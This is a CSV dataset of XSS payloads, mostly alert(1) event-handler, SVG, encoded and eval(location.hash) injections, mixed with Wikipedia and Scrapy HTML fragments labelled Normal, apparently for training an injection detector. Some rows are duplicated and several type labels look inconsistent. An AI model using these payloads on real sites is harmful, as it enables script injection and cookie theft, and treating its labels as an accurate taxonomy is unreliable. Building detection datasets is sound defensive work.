Sentence,Final_Label
"<source oncopy=""alert(1)"" contenteditable>test</source>",Reflected XSS
"<html oncut=""alert(1)"" contenteditable>test</html>",Reflected XSS
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",Stored XSS
"<a href=""/wiki/Applied_information_economics"" title=""Applied information economics"">Information value theory </a>:",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<object id=x onfocusin=alert(1) type=text/html>,Stored XSS
<svg><plaintext onload=alert(1)></plaintext>,Stored XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" ontransitionend=alert(1)></html>",Reflected XSS
"<script draggable=""true"" ondragstart=""alert(1)"">test</script>",Stored XSS
"<kbd onclick=""alert(1)"">test</kbd>",Reflected XSS
"<object oncontextmenu=""alert(1)"">test</object>",Stored XSS
<svg><rp onload=alert(1)></rp>,Stored XSS
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
 </li>,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"	 <div class=""toctitle"" lang=""en"" dir=""ltr""><h2 id=""mw-toc-heading"">Contents </h2><span class=""toctogglespan""><label class=""toctogglelabel"" for=""toctogglecheckbox""> </label> ",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
	 </span> 2019 ,Normal
"SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>",Stored XSS
	 </span> </h2>,Normal
<svg><tbody onload=alert(1)></tbody>,Stored XSS
<svg><caption onload=alert(1)></caption>,Stored XSS
[1].find(alert),Stored XSS
"<li id=""cite_note-The_mathematical_objection-357""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-The_mathematical_objection_357-0"">^ </a> </b> ",Normal
"<li><a href=""/wiki/Programming_team"" title=""Programming team"">Programming team </a> </li>",Normal
<command onpointerleave=alert(1)>XSS</command>,Reflected XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"General intelligence (<a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">strong AI </a>) is discussed in popular introductions to AI:",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<legend id=x tabindex=1 onfocus=alert(1)></legend>,Reflected XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",Stored XSS
top[“al”+”ert”](1),Stored XSS
<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>,Stored XSS
"<li><a href=""/wiki/Pedro_Domingos"" title=""Pedro Domingos"">Domingos, Pedro </a>, ""Our Digital Doubles:  AI will serve our species, not control it"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 319, no. 3 (September 2018), pp.&#160;88–93. </li>",Normal
"<li id=""cite_note-FOOTNOTE&#39;&#39;Kismet&#39;&#39;-136""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTE&#39;&#39;Kismet&#39;&#39;_136-0"">^ </a> </b> ",Normal
 </li>,Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",Reflected XSS
"<ul><li><a href=""/wiki/Biorobotics"" title=""Biorobotics"">Biorobotics </a> </li>",Normal
"<hgroup draggable=""true"" ondragleave=""alert(1)"">test</hgroup>",Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
 </li>,Normal
"<audio onmouseover=""alert(1)"">test</audio>",Reflected XSS
"<h3><span class=""mw-headline"" id=""Superintelligence"">Superintelligence ",Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<A HREF=""//google""></A>",Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<textarea id=x tabindex=1 onactivate=alert(1)></textarea>,Reflected XSS
"<cite onmouseenter=""alert(1)"">test</cite>",Reflected XSS
<col onpointerdown=alert(1)>XSS</col>,Reflected XSS
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,Stored XSS
"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;216–222 </li>",Normal
"<track onmouseup=""alert(1)"">test</track>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
	 </span>,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
 </li>,Normal
"          <i data-toggle=""wy-nav-top"" class=""fa fa-bars""></i>",Normal
"<mark onclick=""alert(1)"">test</mark>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<svg><bdo onload=alert(1)></bdo>,Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<li><a href=""/wiki/Evolution_strategy"" title=""Evolution strategy"">Evolution strategy </a> </li>",Normal
"<textarea onmouseenter=""alert(1)"">test</textarea>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Kermany, D; Goldbaum, M; Zhang, Kang (2018). <a rel=""nofollow"" class=""external text"" href=""https://www.cell.com/action/captchaChallenge?redirectUri=%2Fcell%2Fpdf%2FS0092-8674%2818%2930154-5.pdf"">""Identifying Medical Diagnoses and Treatable Diseases by Image-Based Deep Learning"" </a> <span class=""cs1-format"">(PDF) ",Normal
<summary onpointermove=alert(1)>XSS</summary>,Reflected XSS
"	 </span>. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2016arXiv160605830C"">2016arXiv160605830C </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2FTRO.2016.2624754"">10.1109/TRO.2016.2624754 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Transactions+on+Robotics&amp;rft.atitle=Past%2C+Present%2C+and+Future+of+Simultaneous+Localization+and+Mapping%3A+Toward+the+Robust-Perception+Age&amp;rft.volume=32&amp;rft.issue=6&amp;rft.pages=1309-1332&amp;rft.date=2016-12&amp;rft_id=info%3Aarxiv%2F1606.05830&amp;rft_id=info%3Adoi%2F10.1109%2FTRO.2016.2624754&amp;rft_id=info%3Abibcode%2F2016arXiv160605830C&amp;rft.aulast=Cadena&amp;rft.aufirst=Cesar&amp;rft.au=Carlone%2C+Luca&amp;rft.au=Carrillo%2C+Henry&amp;rft.au=Latif%2C+Yasir&amp;rft.au=Scaramuzza%2C+Davide&amp;rft.au=Neira%2C+Jose&amp;rft.au=Reid%2C+Ian&amp;rft.au=Leonard%2C+John+J.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<link rel=""canonical"" href=""https://docs.scrapy.org/en/latest/"" />",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<svg><br onload=alert(1)></br>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<li ondblclick=""alert(1)"">test</li>",Reflected XSS
<svg><sub onload=alert(1)></sub>,Stored XSS
"<li><cite id=""CITEREFPoliLangdonMcPhee2008"" class=""citation book"">Poli, R.; Langdon, W. B.; McPhee, N. F. (2008). <a rel=""nofollow"" class=""external text"" href=""http://www.gp-field-guide.org.uk/""><i>A Field Guide to Genetic Programming </i> </a>. Lulu.com. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-4092-0073-4"" title=""Special:BookSources/978-1-4092-0073-4""><bdi>978-1-4092-0073-4 </bdi> </a> &#8211; via gp-field-guide.org.uk. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=A+Field+Guide+to+Genetic+Programming&amp;rft.pub=Lulu.com&amp;rft.date=2008&amp;rft.isbn=978-1-4092-0073-4&amp;rft.aulast=Poli&amp;rft.aufirst=R.&amp;rft.au=Langdon%2C+W.+B.&amp;rft.au=McPhee%2C+N.+F.&amp;rft_id=http%3A%2F%2Fwww.gp-field-guide.org.uk%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<li class=""toclevel-2 tocsection-43""><a href=""#Military""><span class=""tocnumber"">7.8 ",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<svg><tt onload=alert(1)></tt>,Stored XSS
<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>,Reflected XSS
"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<marquee onpaste=""alert(1)"" contenteditable>test</marquee>",Reflected XSS
<sub id=x tabindex=1 onfocus=alert(1)></sub>,Reflected XSS
"      <li><a href=""#"">Docs</a> &raquo;</li>",Normal
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<li id=""cite_note-199""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-199"">^ </a> </b> ",Normal
<object onpointerover=alert(1)>XSS</object>,Stored XSS
	 </span></a></dt><dd>Understand what Scrapy is and how it can help you.</dd>,Normal
"<p>Intelligent agents must be able to set goals and achieve them.<sup id=""cite_ref-Planning_110-0"" class=""reference""><a href=""#cite_note-Planning-110"">&#91;107&#93; </a> </sup> They need a way to visualize the future—a representation of the state of the world and be able to make predictions about how their actions will change it—and be able to make choices that maximize the <a href=""/wiki/Utility"" title=""Utility"">utility </a> (or ""value"") of available choices.<sup id=""cite_ref-Information_value_theory_111-0"" class=""reference""><a href=""#cite_note-Information_value_theory-111"">&#91;108&#93; </a> </sup>",Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<svg><frameset onload=alert(1)></frameset>,Stored XSS
<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<ul><li><a href=""#CITEREFvan_der_WaltBernard2006"">van der Walt &amp; Bernard 2006 </a> </li> </ul>",Normal
<footer onpointerleave=alert(1)>XSS</footer>,Reflected XSS
<svg><rb onload=alert(1)></rb>,Stored XSS
"<canvas onmouseover=""alert(1)"">test</canvas>",Reflected XSS
"<li id=""cite_note-Representing_causation-95""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Representing_causation_95-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Representing_causation_95-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
eval(a+b+c+d),Stored XSS
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",Reflected XSS
"<svg onmousedown=""alert(1)"">test</svg>",Stored XSS
<svg><time onload=alert(1)></time>,Stored XSS
"<b onkeydown=""alert(1)"" contenteditable>test</b>",Reflected XSS
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
	 </span>,Normal
"<sup id=""cite_ref-FOOTNOTEDomingos2015_152-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015-152"">&#91;149&#93; </a> </sup> Finally, a few ""emergent"" approaches look to simulating human intelligence extremely closely, and believe that <a href=""/wiki/Anthropomorphism"" title=""Anthropomorphism"">anthropomorphic </a> features like an <a href=""/wiki/Artificial_brain"" title=""Artificial brain"">artificial brain </a> or simulated <a href=""/wiki/Developmental_robotics"" title=""Developmental robotics"">child development </a> may someday reach a critical point where general intelligence emerges.<sup id=""cite_ref-Brain_simulation_153-0"" class=""reference""><a href=""#cite_note-Brain_simulation-153"">&#91;150&#93; </a> </sup>",Normal
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>,Reflected XSS
"<iframe onkeydown=""alert(1)"" contenteditable>test</iframe>",Stored XSS
<svg><noscript onload=alert(1)></noscript>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<source onpointerup=alert(1)>XSS</source>,Reflected XSS
<svg><applet onload=alert(1)></applet>,Stored XSS
<svg><discard onbegin=alert(1)>,Stored XSS
	 </span>,Normal
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<nav onpointermove=alert(1)>XSS</nav>,Reflected XSS
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationstart=""alert(1)""></rb>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<li><cite id=""CITEREFRussellNorvig2003"" class=""citation""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart J. </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Norvig, Peter </a> (2003), <a rel=""nofollow"" class=""external text"" href=""http://aima.cs.berkeley.edu/""><i>Artificial Intelligence: A Modern Approach </i> </a> (2nd ed.), Upper Saddle River, New Jersey: Prentice Hall, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/0-13-790395-2"" title=""Special:BookSources/0-13-790395-2""><bdi>0-13-790395-2 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+New+Jersey&amp;rft.edition=2nd&amp;rft.pub=Prentice+Hall&amp;rft.date=2003&amp;rft.isbn=0-13-790395-2&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart+J.&amp;rft.au=Norvig%2C+Peter&amp;rft_id=http%3A%2F%2Faima.cs.berkeley.edu%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
